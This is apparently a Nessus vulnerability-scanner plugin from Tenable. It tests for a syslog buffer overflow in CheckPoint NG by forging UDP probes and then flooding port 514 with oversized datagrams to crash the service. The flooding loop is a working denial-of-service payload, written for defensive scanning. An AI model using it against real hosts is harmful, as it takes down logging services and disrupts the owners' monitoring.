#
# This script is (C) Tenable Network Security
#
#

if(description)
{
 script_id(11613);
 script_bugtraq_id(7159);
 script_version ("$Revision: 1.5 $");

 
 name["english"] = "CP syslog overflow";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running a syslog server (probably
CheckPointNG syslog server).

An attacker may remotely disable this server by sending
too much data to it.

*** Nessus disabled this service to perform this security check

Solution : Upgrade to NG FP3 HF2
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "crashes the remote syslog daemon";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);	# ACT_FLOOD?
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 exit(0);
}

#
# The strategy is to send an empty UDP packet and expect an ICMP-unreach message.
# If we don't get one, we crash the remote service and try again. If the results
# differ, then there was a service.
#
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

sport = rand() % 65000 + 1024;

function check(dport)
{ 
 ippkt = forge_ip_packet(
        ip_hl   :5,
        ip_v    :4,
        ip_tos  :0,
        ip_len  :20,
        ip_id   :31337,
        ip_off  :0,
        ip_ttl  :64,
        ip_p    :IPPROTO_UDP,
        ip_src  :this_host()
        );


  udppacket = forge_udp_packet(
        ip      :ippkt,
        uh_sport:sport,
        uh_dport:dport,
        uh_ulen :8
        );
	
  filter = string("src host ", get_host_ip(), " and dst host ", this_host(),
 " and icmp and (icmp[0] == 3  and icmp[28:2]==", sport, ")");
  for(i=0;i<5;i++)
  	send_packet(udppacket, pcap_active:FALSE);
	
  res = send_packet(udppacket, pcap_active:TRUE, pcap_filter:filter);
  if(res != NULL) return(1);
  else return(0);
}


if(check(dport:514) == 0 )
{ 
  soc = open_sock_udp(514);
  send(socket:soc, data:'<189>19: 00:01:04: Test\n');
  for(i=0;i<255;i++)
  {
  	send(socket:soc, data:crap(4096));
  }
  r = recv(socket:soc, length:4096);
  
  close(soc);
  sleep(1);
  
  if(check(dport:514) == 1)security_hole(port:514, proto:"udp");
}
